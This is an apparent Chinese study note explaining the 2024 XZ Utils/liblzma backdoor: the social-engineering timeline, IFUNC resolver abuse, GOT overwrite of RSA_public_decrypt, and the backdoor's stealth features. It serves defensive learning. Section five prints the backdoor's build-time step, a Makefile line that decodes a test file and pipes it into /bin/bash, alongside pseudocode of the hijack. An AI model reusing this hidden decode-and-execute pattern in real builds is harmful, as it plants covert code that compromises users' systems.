---
title: XZ Utils 后门事件学习笔记 — 从供应链信任崩塌看 SSH 服务器是如何被攻破的
来源: https://www.openwall.com/lists/oss-security/2024/03/29/4
日期: 2026-06-13
分类: 安全与隐私
子分类: 安全与隐私
provenance: pipeline-v3
---

# XZ Utils 后门事件学习笔记

## 一、一个日常类比：被污染的"标准件"

想象你住在一个小区，每家每户的门锁都按照同一份国家标准制造。这份标准由一位德高望重的工程师编写和维护，大家都信任他。

某天，一位叫 "Jia Tan" 的人通过多年社交运作，成了这位工程师的"得力助手"，最终拿到了修改标准文档的权限。他在标准里偷偷塞了一条：如果你用的是 x86-64 架构的 Linux 系统、用 GCC 编译、并且正在打包成 deb 或 rpm 格式——那就在编译时多跑一段隐藏代码。这段代码会在最终的产品里安装一个"暗门"。

问题在于：几乎每个 Linux 发行版都用这份标准。所以暗门随着正常更新，悄悄装进了数亿台机器。

这就是 2024 年 3 月震惊世界的 XZ Utils 后门事件。

## 二、什么是 XZ Utils 和 liblzma？

**XZ Utils** 是一套文件压缩工具（类似 gzip、bzip2），核心库叫 **liblzma**。它不是什么"应用软件"，而是 Linux 系统里无数软件都会依赖的**底层库**——就像盖房子用的水泥。你看不见它，但房子离不了它。

**OpenSSH** 是 Linux 上最常用的远程登录工具。正常情况下，OpenSSH 和 liblzma 根本没有关系。但因为 Debian 等发行版给 OpenSSH 打了一个补丁（用于 systemd 通知功能），让 OpenSSH 间接依赖了 libsystemd，而 libsystemd 又依赖了 liblzma。就这样，两条本不相干的线被连到了一起。

## 三、攻击时间线（从第一性原理推导）

**为什么攻击者要花两年以上的时间？**

如果直接入侵一个系统，成本高且覆盖面小。但如果污染了一个被所有人使用的"标准件"，一次投放，影响全球。这是一种**杠杆思维**：用最小的投入换取最大的影响范围。

- **2021 年起**：攻击者 "Jia Tan" 开始以"热心社区贡献者"的身份接触 XZ Utils 项目，使用多个马甲账号（如 "Jigar Kumar"、"krygorin4545"）施压原 maintainer，争取提交权限
- **2024 年 2 月**：拿到权限后，在 XZ 5.6.0 中植入后门代码
- **2024 年 3 月**：5.6.1 发布，后门随之扩散
- **2024 年 3 月 27 日**：开发者 Andres Freund 在 Debian sid 上发现 SSH 登录变慢、valgrind 报错，开始调查
- **2024 年 3 月 29 日**：在 oss-security 邮件列表公开披露
- **2024 年 5 月 29 日**：正式修复版 5.6.2 发布，CVE-2024-3094，CVSS 评分 10.0（满分）

## 四、核心概念解析

### 4.1 供应链攻击（Supply Chain Attack）

攻击者不直接攻破目标系统，而是攻击目标系统所依赖的第三方组件。就像不在你家门上动手，而是在送你家的自来水里下毒——所有喝这水的人都会中招。

**关键特征**：
- 依赖链长且隐蔽（OpenSSH → libsystemd → liblzma）
- 信任传递（用户信任发行版，发行版信任上游源代码）
- 检测极难（代码看起来是正常的压缩库）

### 4.2 .ifunc 与运行时函数解析

Linux 上的动态库可以用 **IFUNC**（Interface Function）机制，让函数在程序启动时"动态选择"最优实现。比如 crc32/crc64 校验函数会根据 CPU 指令集自动选最快的版本。

攻击者利用了这一点：**替换了 ifunc 解析函数**，在程序刚启动、一切还在内存里、防护还没完全生效的时候，执行恶意代码。

### 4.3 GOT 覆盖（Global Offset Table）

程序调用外部函数时，会先查 GOT 表，GOT 表里存的是函数的真实地址。攻击者把 GOT 表中 `RSA_public_decrypt` 的地址改成了指向自己的恶意代码。这样每次 SSH 验证公钥时，走的都是攻击者的逻辑。

这就像你去银行取钱，银行系统查"授权经理"的工位时，发现去了一个冒牌经理的座位——冒牌经理说"我批准了"，系统就信了。

## 五、后门的工作原理（代码示例）

### 示例 1：构建时注入——通过 makefile 解码并执行隐藏脚本

后门的第一阶段发生在**编译阶段**。攻击者修改了发布包中的 `m4/build-to-host.m4` 文件（这个文件在 git 仓库里不存在，只在发布的 tarball 里）。它会在 configure 阶段注入一段恶意指令到 Makefile 中：

```makefile
# 攻击者注入的恶意 Makefile 规则
# 当满足条件时（x86-64 + GCC + GNU ld + Debian/RPM 构建），
# 这段规则会在测试阶段触发：

am__test = bad-3-corrupt_lzma2.xz
am__test_dir = $(top_srcdir)/tests/files/$(am__test)

# 关键行：在运行测试时，先 sed 处理一个 .xz 文件，
# 再用 xz 解压，最后 piped 到 bash 执行
sed rpath $(am__test_dir) | \
  tr "\t \-\_" " \t\_-" | \
  xz -d | /bin/bash >/dev/null 2>&1;
```

**逐行解读**：
1. `sed rpath ...` — 替换文件中的占位符
2. `tr "\t \-\_" " \t\_-"` — 字符替换（base64 风格编码）
3. `xz -d` — 用 xz 解压编码后的数据（这里面是真正的恶意脚本）
4. `| /bin/bash` — 把解压出来的内容当作 shell 脚本执行！

**类比**：就像你在快递盒里发现一个小盒子，打开小盒子发现里面有个自动播放的视频——但视频直接连到了你家电脑的控制台。

### 示例 2：运行时劫持——通过 ifunc 解析器替换 GOT 表

后门进入编译好的 liblzma.so 后，在程序启动时激活。以 sshd 为例：

```c
// 正常情况：crc64_resolve() 返回根据 CPU 能力选择的最快 crc64 实现
static uint64_t (*crc64_resolve)(void) {
    // 检测 CPU 是否支持 BMI2 指令集
    if (have_cpuinfo_bmi2())
        return crc64_bmi2;    // 用 BMI2 优化版本
    else
        return crc64_generic;  // 用通用版本
}

// 攻击者替换后的 crc64_resolve()：
// 第一次调用：检查条件（CPU 架构、编译器、构建环境等）
// 第二次调用：安装动态链接器审计钩子（audit hook）
//              等待 RSA_public_decrypt 符号被解析
//              然后把 GOT 表中 RSA_public_decrypt 的地址
//              指向自己的恶意代码

// 恶意解析器的核心逻辑（伪代码）：
static uint64_t (*malicious_crc64_resolve)(void) {
    static int called_count = 0;
    called_count++;

    if (called_count == 1) {
        // 第一次：记录环境信息，检查条件
        // 条件包括：build == x86_64-*linux-gnu*
        //          CC == gcc, linker == GNU ld
        //          存在 debian/rules 或 RPM_ARCH == x86_64
        //          TERM 未设置、LANG 已设置
        // 如果条件满足，标记为"继续执行"
        return normal_cpuid_result();
    }

    if (called_count == 2 && should_execute) {
        // 第二次：安装审计钩子到动态链接器
        // 监听所有符号解析事件
        // 当遇到 RSA_public_decrypt 被解析时，
        // 修改 GOT 表项，指向后门代码
        inject_audit_hook();
        wait_for_rsa_symbol();
        overwrite_got_entry("RSA_public_decrypt", backdoor_code_address);
        remove_audit_hook();
    }

    return normal_crc64_result();
}
```

**运行时发生了什么？**

```
sshd 启动
  │
  ├── liblzma.so 加载
  │     │
  │     ├── crc64_resolve() 被动态链接器调用（因为 -Wl,-z,now）
  │     │     │
  │     │     ├── 第 1 次调用：检查环境 ✓ 满足条件
  │     │     ├── 第 2 次调用：安装审计钩子 → 拦截符号解析
  │     │     │     │
  │     │     │     ├── 监听 RSA_public_decrypt 解析
  │     │     │     ├── 找到 GOT 表项
  │     │     │     └── 篡改地址 → 指向后门代码
  │     │     │
  │     │     └── 移除审计钩子
  │     │
  │     └── 其他库陆续加载（libcrypto 等）
  │
  └── 用户发起 SSH 连接
        │
        ├── sshd 验证客户端公钥
        │     │
        │     ├── 调用 RSA_public_decrypt()  ← 实际走到后门代码
        │     │     │
        │     │     ├── 后门代码持有 Ed448 私钥
        │     │     ├── 构造一个"合法的"认证回复
        │     │     └── 绕过正常认证，获得 root 权限
        │     │
        │     └── 正常代码根本不知道自己已经被替换了
```

**类比**：就像银行系统的"授权经理"工位上坐着一个戴着假名牌的冒牌货。每次需要授权时，系统去查那个工位，冒牌货说"批准"，系统就照做。没人知道真正的经理已经被关在储藏室里了。

## 六、为什么这个后门如此隐蔽？

1. **两层分发机制**：恶意代码只在 tarball 里（git 仓库是干净的），绕过 git diff 检查
2. **条件触发**：只在特定环境（x86-64 + gcc + GNU ld + deb/rpm）下激活，研究者用 clang 或 musl 就触发不了
3. **反调试**：检测到 rr、gdb 等调试环境时自动失效
4. **延迟激活**：不在 systemd 环境下启动 sshd 时不触发（增加分析难度）
5. **性能退化伪装**：SSH 登录变慢约 0.5 秒，看起来像性能回归而非攻击

## 七、修复与影响

**修复方式**：
- 发行版回退到 5.5.x 版本
- Ubuntu 24.04 Beta 延期一周，重新编译所有包
- 5.6.2 正式移除后门代码
- GitHub 暂时禁用了项目仓库镜像

**长期影响**：
- OpenSSF 和 OpenJS 联合警告：类似社交工程攻击已 targeting JavaScript 项目
- 引发关于"关键基础设施依赖无偿志愿者"的广泛讨论
- 安全研究员 Alex Stamos 评价："这可能是有史以来最广泛、最有效的后门"

## 八、从零开始理解的要点总结

| 概念 | 类比 | 真实含义 |
|------|------|----------|
| 供应链攻击 | 在水库里下毒 | 通过污染上游组件影响所有下游使用者 |
| liblzma | 水泥 | 底层压缩库，被大量软件间接依赖 |
| ifunc | 自动选择最优路线 | 运行时根据 CPU 选择最优函数实现 |
| GOT 覆盖 | 冒牌授权经理 | 修改函数跳转表，让程序执行恶意代码 |
| tarball vs git | 快递盒 vs 工厂日志 | 发布包包含 git 里没有的恶意构建脚本 |
| CVSS 10.0 | 满分危险 | 可远程利用、无需认证、完全控制 |

## 九、给自己的思考题

1. 如果我们无法信任上游开源项目，软件供应链的"信任链"应该在哪里断开？
2. 为什么 5.6.0 到 5.6.1 之间，攻击者要调整 exploit 代码来适配新的栈布局？这说明攻击者当时在应对什么问题？
3. Andres Freund 是在 Debian sid（开发版）上发现的。如果这个后门只影响 stable 版，它可能要更久才会被发现——这对我们理解开源社区的安全响应机制有什么启示？
